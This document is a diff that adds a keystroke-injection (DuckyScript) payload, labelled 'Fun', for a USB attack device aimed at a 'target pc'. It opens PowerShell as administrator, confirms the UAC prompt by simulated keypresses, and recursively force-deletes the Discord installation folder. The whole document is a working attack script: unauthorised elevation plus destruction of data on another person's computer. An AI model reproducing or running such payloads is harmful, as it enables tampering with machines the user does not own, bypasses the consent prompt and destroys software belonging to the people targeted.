@@ -1,0 +1,20 @@
+REM Author: UNC0V3R3D (UNC0V3R3D#8662 on Discord)
+REM Description: Deletes discord if it exists on the target pc.
+REM Version: 1.0
+REM Category: Fun
+DELAY 500
+GUI r
+DELAY 300
+REM Start PowerShell as Admin
+STRING powershell Start-Process powershell -Verb runAs
+DELAY 300
+ENTER
+DELAY 500
+LEFTARROW
+DELAY 450
+ENTER
+DELAY 600
+REM delete discord
+STRING if (Test-Path "C:\Program Files (x86)\Discord") { Remove-Item -Recurse -Force "C:\Program Files (x86)\Discord"; Write-Output "Deleted Discord from $discordPath" } else { Write-Output "Discord is not installed on this computer." }; exit
+DELAY 200
+ENTER
